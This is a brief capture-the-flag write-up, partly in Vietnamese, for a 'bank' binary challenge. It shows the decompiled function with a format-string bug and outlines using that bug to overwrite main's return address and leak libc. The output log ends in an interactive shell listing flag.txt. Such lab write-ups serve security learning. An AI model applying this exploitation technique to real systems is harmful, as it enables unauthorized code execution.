# write up bank
```c
    extern unsigned long long g_404070;

    void info()
    {
        char v1;  // [bp+0x8]
        unsigned long long v2;  // rbp

        printf(g_404070);
        printf("Money: %u\n");
        v2 = *((long long *)&v1);
        return;
    }
```
- yeah, format string =)) 
- cộng thêm quả chương trình lặp đi lặp lại nên chỉ cần nhắm vào return của main, đến khi chọn exit cái là nhảy vào gadget, bài này hơi dài nhưng có format string là có tất cả 
- có thêm pop rdi là có thể leak libc để sau đó kiếm được libc version, vì chương trình k có sẵn gadgets và libc nữa 
```bash
[*] target: 0x269a
[*] byte: 0x269a
[*] byte: 0x58e4
[*] target: 0x269c
[*] byte: 0x269c
[*] byte: 0x7f4d
[*] target: 0x26a0
[*] byte: 0x26a0
[*] byte: 0xdbf0
[*] target: 0x26a2
[*] byte: 0x26a2
[*] byte: 0x58cd
[*] target: 0x26a4
[*] byte: 0x26a4
[*] byte: 0x7f4d
[*] Switching to interactive mode
 See you later!
1. Login
2. Register
3. Exit
> $ 3
$ ls
banking
flag.txt
run.sh
$  
```
